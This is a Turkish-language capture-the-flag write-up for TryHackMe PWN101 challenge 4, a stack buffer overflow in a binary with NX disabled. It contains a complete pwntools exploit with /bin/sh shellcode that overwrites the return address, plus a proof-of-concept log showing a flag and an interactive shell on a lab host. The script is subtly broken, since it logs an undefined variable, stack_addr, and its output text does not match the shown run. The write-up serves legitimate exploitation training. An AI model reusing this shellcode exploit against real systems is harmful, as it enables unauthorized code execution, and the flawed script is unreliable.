# TryHackMe PWN101

## Challenge 4

### Dosya
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Dosya 64 bitlik bir ELF dosyası.

Dosyada NX disabled bilgisi var. NX disabled olduğu icin stack üzerinde kod çalıştırabiliriz.

```
$ ./pwn104 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffd43904f20
```

dosyayı çalıştırdığımızda bize bir adres veriyor. Bu adres bizim buffer'ımızın adresi olacak.

Dosyanın assembly koduna baktığmızda 0x50 byte'lik bir stack olduğunu görebiliyoruz, bu byte'lardan sonra 8 byte'lık RBP ve 8 byte'lik RET ADDR olacak.

```asm
0x00000000004011d1 <+4>:     sub    $0x50,%rsp
```

Ayrıca programı decompile ettiğimizde 'read' ile okunan byte sayısının 200 olduğunu görüyoruz. Bu da 0x50 byte sonrasıdaki byte'ları da değiştirebileceğimiz anlamına geliyor.

```c
read(0, &buf, 200);
```

### Exploit

Program bizden girdi istediğinde önce shellcode'mizi gireceğiz, ondan sonra buffer'ı 0x50 byte olana kadar doldurup sonrasında RBP ve RET ADDR'ı değiştireceğiz.

RBP olarak ne girdiğimizin önemi olmayacak ama RET ADDR olarak programın en başta bize verdiği buffer'ımızın adresini gireceğiz ve program shellcode'muzu olduğu yere gidecek. 

### POC

```bash
$ ./exploit.py remote 10.10.230.167 9004
[+] Opening connection to 10.10.230.167 on port 9004: Done
[*] Address of the buffer: 0x7ffd08710c10
[*] Sending Payload.
[*] Getting Flag
[+] Flag achieved!: THM{[REDACTED]}
[+] Getting Shell.
[*] Switching to interactive mode
$ id
uid=1005(pwn104) gid=1005(pwn104) groups=1005(pwn104)
```

### Python Script

```python
#!/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challange 4 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port')
remote_parser.add_argument('ip', help='IP address')
remote_parser.add_argument('port', help='Port number')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port
    p = remote(ip, port)
elif mode == 'local':
    file = args.file
    context.binary = binary = ELF(file)
    p = process()
else:
    parser.error('Please select remote or local mode.')
    
p.recvuntil(b"for you at ")
buffer_addr = p.recv().decode()
log.info("Address of buffer: " + stack_addr)

shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

payload = b''.join([
    shell_code,
    b'A'*(0x50 - len(shell_code)),
    b'B'*0x8,
    p64(int(buffer_addr, 16))
    ])

log.info("Sending Payload.")
p.sendline(payload)

log.info("Getting Flag")
p.sendline(b"cat flag.txt")
flag = p.recv().decode()

log.success("Flag achieved!: " + flag)

log.success("Getting Shell.")
p.interactive()
```
